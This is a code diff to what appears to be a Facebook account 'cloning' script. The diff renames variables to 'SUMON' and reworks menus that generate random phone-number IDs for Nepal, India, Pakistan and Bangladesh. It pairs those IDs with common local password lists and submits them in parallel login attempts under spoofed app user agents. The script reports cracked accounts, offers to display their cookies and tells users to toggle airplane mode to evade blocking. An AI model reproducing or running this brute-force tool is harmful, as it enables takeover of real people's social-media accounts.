@@ -81,8 +81,8 @@ try:
     import mechanize
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python dev.py')
+    os.system('pip install mechanize requests futures==2 > /SUMON/null')
+    os.system('python SUMON.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -245,7 +245,7 @@ for ua in range(10000):
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     uas.append(uaku2)
 
-devua =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Safari/537.36",
+SUMONua =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Safari/537.36",
 "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.2; ru-ru; SAMSUNG GT-I9200 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-N950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
@@ -637,7 +637,7 @@ devua =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T285 Build/LMY47V) AppleW
 "Mozilla/5.0 (Linux; arm_64; Android 14; SM-A346E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.80 YaBrowser/24.1.6.80.00 SA/3 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; arm; Android 6.0.1; SM-N910F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.3.26.00 (alpha) SA/3 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; arm_64; Android 14; 22111317PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.88 YaBrowser/24.1.5.88.00 SA/3 Mobi", 
-devapi=[]
+SUMONapi=[]
 for ksh in range(5000):
     samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
     fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
@@ -652,7 +652,7 @@ for ksh in range(5000):
     cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
     network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
     ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
-    devapi.append(ua)
+    SUMONapi.append(ua)
 for khd in range(5000):
     VAPP = random.randint(410000000,499999999)
     fbs = random.choice([
@@ -665,7 +665,7 @@ for khd in range(5000):
     gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
     gtt=random.choice(gt)
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(7,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/"+fbs+";FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
-    devapi.append(ua)
+    SUMONapi.append(ua)
 for okdk in range(5000):
     application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
     application_version_code=str(random.randint(000000000,999999999))
@@ -683,7 +683,7 @@ for okdk in range(5000):
     uaall =([uaa,uab,uac,uad,uae,uaf,uag])
     ua = random.choice(uaall)
     #print(f' {B}|{G}USERAGENT{B}|{P} {ua}');time.sleep(2);sifat()
-    devapi.append(ua)
+    SUMONapi.append(ua)
 
 red = "\033[1;31m"
 green = "\033[1;32m"
@@ -804,14 +804,14 @@ def get_current_location():
         return None, None
 # Example usage
 current_city, current_country = get_current_location()
-def get_device_info(prop_name):
+def get_SUMONice_info(prop_name):
     try:
         result = subprocess.run(['getprop', prop_name], capture_output=True, text=True, check=True)
         return result.stdout.strip()
     except subprocess.CalledProcessError as e:
         print(f"Error retrieving {prop_name}: {e}")
         return None
-manufacturer_name = get_device_info('ro.product.manufacturer')
+manufacturer_name = get_SUMONice_info('ro.product.manufacturer')
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 os.system("xdg-open ")
 os.system("clear")
@@ -837,7 +837,7 @@ def oo(text):
 
 
     
-xxxx = str(len(devua))
+xxxx = str(len(SUMONua))
 #---------------------[LOOP MENU]---------------------#
 loop = 0
 oks = []
@@ -899,19 +899,19 @@ def wow(text):
 def linex():
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-def dev_time():
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Device    : {manufacturer_name}-android-v-{android_version}")
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location  : {current_city}-{current_country} ")
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date      : {datex} ")
+def SUMON_time():
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] SUMONice     : {manufacturer_name}-android-v-{android_version}")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location   : {current_city}-{current_country} ")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date       : {datex} ")
     linex()
 
 def menu():
     clear()
-    dev_time()
+    SUMON_time()
     
     print("[1] FILE CLONING ")
     print("[2] RANDOM CLONING ")
-    print("[3] NUMBER CLONING ")
+    print("[3] PUBLIK CLONING ")
     print("[4] GMAIL CLONING ")
     print("[5] CONTACT (TELEGRAM) ")
     print("[6] EXIT TOOL ")
@@ -967,10 +967,10 @@ def f_clone():
         clear()
         print(" [â¢] EXAMPLE : first123, first1234, first12345 ")
         linex()
-        for dev in range(plimit):
-            ap = input(f" [{dev+1}] ENTER PASSWORD : ")
+        for SUMON in range(plimit):
+            ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
             plist.append(ap)
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
         tl = str(len(idz))
         print(" [â¢] TOTAL ACCOUNTS : "+tl)
@@ -980,11 +980,11 @@ def f_clone():
         for love in idz:
             uid, name = love.split("|")
             pwx = plist
-            if m == "1":dev_xd.submit(freefb, uid, name, pwx, tl)
-            elif m == "2":dev_xd.submit(bapi, uid, name, pwx, tl)
-            elif m == "3":dev_xd.submit(graph, uid, name, pwx, tl)
+            if m == "1":SUMON_xd.submit(freefb, uid, name, pwx, tl)
+            elif m == "2":SUMON_xd.submit(bapi, uid, name, pwx, tl)
+            elif m == "3":SUMON_xd.submit(graph, uid, name, pwx, tl)
             else:
-                dev_xd.submit(graph, uid, name, pwx, tl)
+                SUMON_xd.submit(graph, uid, name, pwx, tl)
     linex()
     print(" [â¢] PROCESS HAS BEEN COMPLETED ")
     print(" [â¢] TOTAL OK ACCOUNTS : "+str(len(oks)))
@@ -995,83 +995,66 @@ def f_clone():
 
 def r_clone():
     clear()
-    dev_time()
-    print(" [1] NEPAL RONDAM")
+    SUMON_time()
+    print(" [1] INDIA RONDAM (full number)")
     print(" [2] INDIA RONDAM")
-    print(" [3] PAKISTAN RAODOM")
+    print(" [3] NEPAL RAODOM")
     print(" [4] BAGLADESH RONDAM")
     print(" [5] RONDAM 4 CHOICE PASS")
     print(" [6] GAMING CLONE")
     linex()
     bithi = input("âCHOOSE> ")
-    if bithi =='1':dev1()
-    elif bithi =='2':dev2()
-    elif bithi =='3':dev3()
-    elif bithi =='4':dev4()
-    elif bithi =='5':dev5()
-    elif bithi =='6':dev6()
+    if bithi =='1':SUMON1()
+    elif bithi =='2':SUMON2()
+    elif bithi =='3':SUMON3()
+    elif bithi =='4':SUMON4()
+    elif bithi =='5':SUMON5()
+    elif bithi =='6':SUMON6()
     else:
         print("SELECT CORRECT OPTION")
         time.sleep(1)
         menu()
     
-def dev1():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  9760,9827,9800,9840,9849') 
-    print(47*'-')
-    kode = input('[?] INPUT CODE : ')
-    print(47*'-')
-    limit = int(input('[?] LIMIT CLONE : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    clear()
-    print("                CHOOSE METHOD                       ")
-    print("[+]ââââââââââââââââââââââââââââââââââââââââ")
-    print(" [1] METHOD (METHOD1) ")
-    print(" [2] METHOD (METHOD2) ")
-    print(" [3] METHOD (METHOD3) ")
-    print(" [4] METHOD (METHOD4) ")
-    print(" [5] METHOD (METHOD5) ")
-    print(" [6] METHOD (METHOD6) ")
-    linex()
-    devfire = input("[+] [CHOOSE] :- ")
-    linex()
-    print(" [?] Do You Want To Show Cookies : (Y/N) ")
-    linex()
-    c = input(" [?] Input : ")
-    if c in ["Y", "y"]:
-        cookie_show.append("yes")
-    else:
-        cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
-        clear()
-        dev_time()
-        tl = str(len(user))
-        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
-        print(f"[+] SIM CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
-        linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
-        for love in user:
-            uid = kode+love
-            pwx = [uid+love,'tamang123 ','tamang1234','maya123','pokhara','nepal123','kathmandu123','pokhara123','kathmandu','tamang12345','nepal12345','nepal1234']
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
-            else:
-                dev_xd.submit(p,uid,pwx,tl)
-    linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
-    linex()
-
-def dev2():
+def SUMON1():
+    fresh()
+    print(f" {wow('â¢')} ENTER NUMBER WITH COUNTRY CODE ")
+    print(f" {wow('â¢')} EXAMPLE : {green}9351048348 ")
+    divider()
+    number = input(f" {wow('-')} ENTER NUMBER : {green}")
+    limit = int(input(f" {wow('-')} ENTER LIMIT  : {green}"))
+    code = number[:4]
+    for _ in range(limit):
+        total = len(number)
+        digits = str(total-4)
+        xnxxx = "".join(random.choice(string.digits) for _ in range(int(digits)))
+        xnxx.append(xnxxx)
+    fresh()
+    pw_limit = int(input(f" {wow('-')} ENTER PASSWORD LIMIT : {green}"))
+    fresh()
+    print(f" {wow('â¢')} EXAMPLE : {green}first6, last6 ")
+    print(f" {wow('â¢')} EXAMPLE : {green}first7, last7 ")
+    print(f" {wow('â¢')} EXAMPLE : {green}khankhan, 57273200 ")
+    print(f" {wow('â¢')} EXAMPLE : {green}fullnumber ")
+    divider()
+    for p in range(pw_limit):
+        p_ask = input(f" {wow(p+1)} ENTER PASSWORD : {green}")
+        pwx.append(p_ask)
+    with tpe(max_workers=55) as Xnxx:
+        fresh()
+        tl = str(len(xnxx))
+        print(f" {wow('-')} TOTAL ACCOUNTS  : {green}{tl} ")
+        print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
+        print(f" {wow('!')} {white}USE FLIGHT MODE FOR SPEED UP ")
+        divider()
+        for user in xnxx:
+            uid = code+user
+            Xnxx.submit(cracker, uid, pwx, tl)
+    divider()
+    print(f" {wow('!')} {green}PROCESS COMPLETED ")
+    print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
+    divider()
+    exit()
+def SUMON2():
     user=[]
     os.system('clear')
     print(logo)
@@ -1085,7 +1068,7 @@ def dev2():
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
-    print("[+]âââââââââââââââââââââââââââââââââââââââââââââââ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (1) ")
     print(" [2] METHOD (2) ")
     print(" [3] METHOD (3) ")
@@ -1093,56 +1076,56 @@ def dev2():
     print(" [5] METHOD (5) ")
     print(" [6] METHOD (6) ")
     linex()
-    devfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    print(" [+] COOKIES /SHOW : (Y/N) ")
+    print(" [+] COOKIES SHOW : (Y/N) ")
     linex()
     c = input(" [?] INPUT : ")
     if c in ["Y", "y"]:
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
-        dev_time()
+        SUMON_time()
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
             pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
             else:
-                dev_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
+    print('[â] ID SAVE SUMON-OK TXT')
     linex()
 
-def dev3():
+def SUMON3():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (92305)')
+    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  9760,9827,9800,9840,9849') 
     print(47*'-')
-    kode = input('[+] INPUT CODE : ')
+    kode = input('[?] INPUT CODE : ')
     print(47*'-')
-    limit = int(input('[+] LIMIT CLONE : '))
+    limit = int(input('[?] LIMIT CLONE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
-    print("[+]ââââââââââââââââââââââââââââââââââââââââ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
     print(" [2] METHOD (METHOD2) ")
     print(" [3] METHOD (METHOD3) ")
@@ -1150,7 +1133,7 @@ def dev3():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    devfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1159,35 +1142,32 @@ def dev3():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
-        dev_time()
+        SUMON_time()
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
-        print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
+        print(f"[+] SIM CODE CHOOSED : "+kode)
+        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
-            mk = uid[:6]
-            pwx = [love]
-            pwx = [kode+love,mk,'khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
+            pwx = [uid+love,'tamang123 ','tamang1234','maya123','pokhara','nepal123','kathmandu123','pokhara123','kathmandu','tamang12345','nepal12345','nepal1234']
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
             else:
-                dev_xd.submit(p,uid,pwx,tl)
-            
+                SUMON_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
+    print('[â] ID SAVE SUMON-OK TXT')
     linex()
 
-def dev4():
+def SUMON4():
     user=[]
     os.system('clear')
     print(logo)
@@ -1201,7 +1181,7 @@ def dev4():
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
-    print("[+]ââââââââââââââââââââââââââââââââââââââââ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
     print(" [2] METHOD (METHOD2) ")
     print(" [3] METHOD (METHOD3) ")
@@ -1209,7 +1189,7 @@ def dev4():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    devfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1218,34 +1198,34 @@ def dev4():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
-        dev_time()
+        SUMON_time()
         tl = str(len(user))
         print(f"[+] YOUR TOTAL IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
             mk = uid[:6]
             pwx = [love]
             pwx = [kode+love,mk,'bangladesh', 'freefire', '506070', '708090', 'i love you', '@#@#@#']
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
